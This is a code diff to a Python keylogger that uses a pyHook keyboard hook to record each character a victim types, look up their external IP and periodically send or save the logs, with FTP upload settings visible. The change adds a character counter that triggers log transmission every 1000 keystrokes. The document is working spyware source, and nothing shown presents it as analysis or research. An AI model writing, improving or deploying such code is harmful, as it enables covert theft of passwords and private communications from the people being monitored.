@@ -28,7 +28,7 @@ strFtpUser = ""
 strFtpPass = ""
 strFtpRemotePath = "/"
 
-intCharPerSend = 1100  # set num of chars before send log/store
+intCharPerSend = 1000  # set num of chars before send log/store
 
 blnUseTime = "False"  # if you prefer to use a timer to send/save logs, set this to True
 strTimePerSend = 120  # set how often to send/save logs in seconds
@@ -64,9 +64,10 @@ def GetExIp(): # function to get external ip
 GetExIpThread = threading.Thread(target=GetExIp).start()
 
 blnStop = "False"
+intLogChars = 0
 
 def OnKeyboardEvent(event):
-    global strLogs, objTimer
+    global strLogs, objTimer, intLogChars
     try:  # check to see if variable is defined
         strLogs
     except NameError:
@@ -149,6 +150,7 @@ def OnKeyboardEvent(event):
     elif event.Ascii == 0:  # if the key is a special key such as alt, win, etc. Pass
         pass
     else:
+        intLogChars += 1
         strLogs = strLogs + chr(event.Ascii)
 
     def CreateNewThreadMessages():  # function for creating thread for sending messages
@@ -167,11 +169,11 @@ def OnKeyboardEvent(event):
         if not objTimer.is_alive():  # check to see if the timer is not active
             objTimer = threading.Timer(strTimePerSend, CreateNewThreadMessages)
             objTimer.start()
-            strLogs = ""
+            strLogs = ""; intLogChars = 0
     else:
-        if len(strLogs) >= intCharPerSend:  # send/save message if log is certain length
+        if intLogChars >= intCharPerSend:  # send/save message if log is certain length
             CreateNewThreadMessages()
-            strLogs = ""
+            strLogs = ""; intLogChars = 0
     return True
 
 hooks_manager = pyHook.HookManager()
